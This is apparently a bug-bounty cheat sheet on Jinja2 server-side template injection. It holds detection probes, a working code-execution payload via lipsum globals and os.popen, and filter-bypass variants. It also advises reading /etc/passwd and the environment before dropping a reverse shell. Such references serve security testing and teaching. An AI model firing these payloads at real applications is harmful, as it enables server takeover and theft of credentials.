# SSTI — Jinja2 RCE

## 📌 What It Is
User-controlled input rendered through Jinja2 (`render_template_string`, eval, custom). Achieves RCE via gadget chain in template context.

## 🔍 How to Find It
Probe `{{7*7}}` → if returns 49, possibly Jinja2/Twig. Probe `{{7*'7'}}` → returns `7777777` = Jinja2.

## 🧪 How to Test It
1. Confirm engine\n2. Find code-exec gadget (most reliable):\n   `{{lipsum.__globals__.os.popen('id').read()}}`\n3. Adapt to filtered context.

## 💣 How to Exploit It
Read /etc/passwd, environment, then drop reverse shell.

## 🔄 Bypass Techniques
Filter `__class__` → use `attr('\\x5f\\x5fclass\\x5f\\x5f')`.\nFilter `os` → use `cycler.__init__.__globals__.os` or `lipsum.__globals__['os']`.\nFilter `()` → use `|attr` chain (in older Jinja).\nFilter `.` → use `[]`.

## 🛠️ Tools
- tplmap\n- SSTImap\n- Burp Param Miner SSTI extensions

## 🎯 Payloads
See PAYLOADS/ssti_payloads_all_engines.md (Jinja2 section).

## 📝 Real-World Examples
Flask Vulnerable lab, multiple H1 reports.

## 🚩 Common Mistakes / Traps
Don't blindly try {{7*7}} on every endpoint — narrow to template-rendering inputs (email body, profile bio, error message customization).

## 📊 Severity & Impact
Critical (CVSS 9.8) — RCE.

## 🔗 References
PortSwigger SSTI labs, payloadbox/ssti.

## ⚡ One-Liners
```bash\ncurl 'https://target/?name={{7*7}}'\n```
